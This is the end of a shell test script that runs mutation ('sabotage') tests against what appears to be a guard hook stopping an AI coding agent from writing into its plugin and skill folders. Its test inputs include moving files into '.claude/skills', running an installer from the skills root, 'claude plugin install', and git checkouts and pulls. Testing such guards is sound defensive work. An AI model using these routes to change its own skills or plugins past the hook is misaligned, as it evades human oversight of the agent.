sabotage "sabotage 095-R1: without the conflict rule a both-sides merge passes" \
  'out.append((rel, h, t if h in (b, t) else CONFLICT))' 'out.append((rel, h, h))' \
  "$(bash_p "git merge old")"
sabotage "sabotage 095a-R1: without mod paths in file_of a Write into a plugin folder passes" \
  'return self.mod_of(p) if mods else None' 'return None' \
  "$(write_p "$MX/lib/util.ts" 'x')"
sabotage "sabotage 095a-R1(c): without the ancestor walk a file under an innocent name passes" \
  'if self.in_plugin_folder(os.path.realpath(p)) or self.in_plugin_folder(os.path.normpath(p)):' 'if False:' \
  "$(write_p "$MX/lib/util.ts" 'x')"
sabotage "sabotage 095a-R3: without the soft/hard split mv into a project skill passes" \
  'and (g.mod_hits.get(h) != "soft" or placing_target(words, i))]' 'and g.mod_hits.get(h) != "soft"]' \
  "$(bash_p "mv /tmp/s .claude/skills/tla")"
sabotage "sabotage 095a-TM-5: without the mod base a program run in the skills root passes" \
  'if (mod_base or lost_mod) and words' 'if False and words' \
  "$(bash_p "cd ~/.claude/skills && /tmp/x/installer")"
sabotage "sabotage 095a-R4: without mod candidates git checkout REV -- . passes" \
  'if rel not in self.files and g.mod_of(full)' 'if False and g.mod_of(full)' \
  "$(mbash_p "git checkout $MREV -- .")"
sabotage "sabotage 095a-R10: without the claude CLI check plugin install passes" \
  'why = claude_cli_verdict(words)' 'why = None' \
  "$(bash_p "claude plugin install x@y")"
sabotage "sabotage 095a-TM-14: without the URL check a pull from a local remote passes" \
  'raise GitUnknown("a pull from a remote whose URL is a local path")' 'return None' \
  "$(bash_p "git pull local main")"

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
